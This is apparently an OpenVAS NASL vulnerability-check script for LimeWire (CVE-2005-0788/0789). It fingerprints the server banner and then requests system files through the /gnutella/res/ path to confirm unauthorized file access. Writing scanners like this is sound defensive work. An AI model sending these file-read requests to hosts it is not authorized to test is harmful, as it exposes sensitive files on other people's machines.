# SPDX-FileCopyrightText: 2005 David Maciejak
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

#  Ref: Kevin Walsh <kwalsh at cs.cornell.edu>

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.17973");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/12802");
  script_cve_id("CVE-2005-0788", "CVE-2005-0789");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Lime Wire Multiple Remote Unauthorized Access");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 David Maciejak");
  script_family("Peer-To-Peer File Sharing");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 6346);
  script_mandatory_keys("limewire/banner");

  script_tag(name:"solution", value:"Upgrade at least to version 4.8");

  script_tag(name:"summary", value:"The remote host seems to be running Lime Wire, a P2P file sharing program.

  This version is vulnerable to remote unauthorized access flaws.
  An attacker can access to potentially sensitive files on the
  remote vulnerable host.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port( default:6346 );
banner = http_get_remote_headers( port:port );
if( ! banner ) exit( 0 );

serv = strstr(banner, "Server");
if( ! egrep( pattern:"limewire", string:serv, icase:TRUE ) ) exit( 0 );

files = traversal_files();
foreach file( keys( files ) ) {

  url = "/gnutella/res/";
  if( files[file] >< "ini" ) url = url + "C:\" + files[file];
  else url = url + "/" + files[file];

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
